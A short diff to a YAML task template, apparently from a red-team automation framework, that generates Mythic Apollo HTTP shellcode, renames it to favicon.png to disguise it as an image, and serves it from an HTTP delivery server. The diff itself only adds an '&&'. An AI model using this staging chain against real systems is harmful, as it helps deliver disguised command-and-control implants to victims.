@@ -7,6 +7,6 @@ metadata:
 
 content: |
   mkdir -p packstation/outbound; \
-  {{ include('scripts/generate-mythic-apollo-http-shellcode.yaml') }} \
+  {{ include('scripts/generate-mythic-apollo-http-shellcode.yaml') }} && \
   mv packstation/outbound/shellcode.bin packstation/outbound/favicon.png && \
   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
